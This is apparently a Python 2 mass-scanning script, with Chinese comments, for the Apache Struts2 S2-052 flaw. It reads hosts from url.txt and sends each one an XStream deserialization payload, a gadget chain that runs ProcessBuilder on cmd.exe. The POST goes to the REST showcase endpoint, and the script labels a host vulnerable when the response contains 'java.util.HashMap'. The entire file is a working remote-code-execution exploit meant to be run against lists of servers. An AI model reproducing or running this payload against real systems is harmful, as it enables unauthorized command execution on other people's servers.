#!/usr/bin/env python
# -*- coding: gbk -*-
# -*- coding: utf-8 -*-
#小二逼
import urllib, httplib
 
 
httpClient = None
 
url_list=[i.replace("\n","") for i in open("url.txt","r").readlines()]
for ip in url_list:
    i=0
    while i < len(url_list):
        i=i+1
        try:
            data =('<map><entry><jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>C:/Windows/System32/cmd.exe</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/></entry></map>')
            headers = {'Content-type': 'application/xml'}
         
         
             
            httpClient = httplib.HTTPConnection(ip, timeout=10)
            httpClient.request('POST', '/struts2-rest-showcase/orders/3', data, headers)
            response = httpClient.getresponse()
            body= response.read()
         
            if "java.util.HashMap" in body:
                print ip,"该url存在s2-052漏洞"
            else:
                print ip,"不存在漏洞"
            break
         
        except Exception, e:
            print e
        finally:
            if httpClient:
                httpClient.close()